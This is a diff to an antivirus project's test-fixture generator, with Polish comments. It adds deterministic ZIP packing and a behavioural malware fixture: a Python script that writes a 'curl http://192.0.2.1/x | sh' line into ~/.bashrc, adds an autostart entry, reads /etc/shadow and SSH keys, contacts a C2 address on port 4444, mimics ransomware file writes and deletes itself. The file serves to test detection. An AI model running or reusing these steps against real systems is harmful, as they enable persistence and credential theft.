@@ -302,6 +302,20 @@ def make_ransom_bat() -> bytes:
     )
 
 
+def _zip_add(zf, name: str, data: bytes) -> None:
+    """Dodaje wpis do ZIP ze STAŁYM znacznikiem czasu.
+
+    Domyślnie zipfile wpisuje bieżącą datę, przez co każde wygenerowanie
+    fixture'a dawałoby inny plik - a odtąd git widziałby zmiany, których nie
+    ma. To ten sam powód, dla którego używamy ziarnowanego RNG.
+    """
+    import zipfile
+    info = zipfile.ZipInfo(name, date_time=(2024, 1, 1, 12, 0, 0))
+    info.compress_type = zipfile.ZIP_DEFLATED
+    info.external_attr = 0o600 << 16
+    zf.writestr(info, data)
+
+
 def make_docm_with_macro() -> bytes:
     """Dokument Office z projektem VBA (.docm) - NIE zawiera działającego kodu.
 
@@ -346,10 +360,10 @@ def make_docm_with_macro() -> bytes:
 
     buf = io.BytesIO()
     with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
-        zf.writestr("[Content_Types].xml", content_types)
-        zf.writestr("_rels/.rels", rels)
-        zf.writestr("word/document.xml", document)
-        zf.writestr("word/vbaProject.bin", vba)
+        _zip_add(zf, "[Content_Types].xml", content_types)
+        _zip_add(zf, "_rels/.rels", rels)
+        _zip_add(zf, "word/document.xml", document)
+        _zip_add(zf, "word/vbaProject.bin", vba)
     return buf.getvalue()
 
 
@@ -364,9 +378,9 @@ def make_clean_docx() -> bytes:
     )
     buf = io.BytesIO()
     with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
-        zf.writestr("[Content_Types].xml",
-                    b'<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>')
-        zf.writestr("word/document.xml", document)
+        _zip_add(zf, "[Content_Types].xml",
+                 b'<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>')
+        _zip_add(zf, "word/document.xml", document)
     return buf.getvalue()
 
 
@@ -428,6 +442,61 @@ def fixture_bytes(count: int) -> bytes:
     return bytes(rng.getrandbits(8) for _ in range(count))
 
 
+BEHAVIOR_MALICIOUS = rb"""#!/usr/bin/env python3
+# FIXTURE: skrypt pokazujacy ZACHOWANIE typowe dla malware.
+# Nie jest zlosliwy: adres 192.0.2.x nalezy do zarezerwowanego zakresu
+# testowego (RFC 5737) i zapisuje wylacznie we wlasnym katalogu piaskownicy.
+# Sluzyl do testowania modulu analizy behawioralnej (avengine/behavior.py).
+import os
+import socket
+
+home = os.environ.get("HOME", "/tmp")
+
+# 1. utrwalenie: dopisanie do profilu powloki i folderu autostartu
+with open(os.path.join(home, ".bashrc"), "a") as fh:
+    fh.write("curl http://192.0.2.1/x | sh\n")
+os.makedirs(os.path.join(home, ".config", "autostart"), exist_ok=True)
+with open(os.path.join(home, ".config", "autostart", "updater.desktop"), "w") as fh:
+    fh.write("[Desktop Entry]\nExec=/tmp/updater\n")
+
+# 2. proba odczytu poswiadczen
+for path in ("/etc/shadow", os.path.join(home, ".ssh", "id_rsa")):
+    try:
+        with open(path, "rb") as fh:
+            fh.read(64)
+    except Exception:
+        pass
+
+# 3. kontakt z C2 na porcie typowym dla shella zwrotnego
+try:
+    s = socket.socket()
+    s.settimeout(1)
+    s.connect(("192.0.2.1", 4444))
+except Exception:
+    pass
+
+# 4. masowe zmiany plikow + zapis tresci o wysokiej entropii (ransomware)
+for i in range(25):
+    with open(os.path.join(home, "dokument_%d.txt" % i), "w") as fh:
+        fh.write("dokument %d" % i)
+with open(os.path.join(home, "dokument_zaszyfrowany.bin"), "wb") as fh:
+    fh.write(os.urandom(8192))
+
+# 5. zatarce sladow: usuniecie wlasnego pliku
+try:
+    os.remove(os.path.abspath(__file__))
+except Exception:
+    pass
+print("done")
+"""
+
+BEHAVIOR_BENIGN = rb"""#!/bin/sh
+# FIXTURE: zwyczajny skrypt - nie powinien wzbudzic zadnego podejrzenia.
+echo "Hello world"
+echo "Katalog domowy: $HOME"
+"""
+
+
 def write(path: Path, data: bytes) -> int:
     path.parent.mkdir(parents=True, exist_ok=True)
     path.write_bytes(data)
@@ -451,6 +520,8 @@ def main() -> int:
         ("malicious/raport.pdf", make_malicious_pdf()),
         ("clean/raport.docx", make_clean_docx()),
         ("clean/dokument.pdf", make_clean_pdf()),
+        ("malicious/behav_dropper.py", BEHAVIOR_MALICIOUS),
+        ("clean/behav_benign.sh", BEHAVIOR_BENIGN),
     ]
 
     print(f"Katalog próbek: {SAMPLES}")
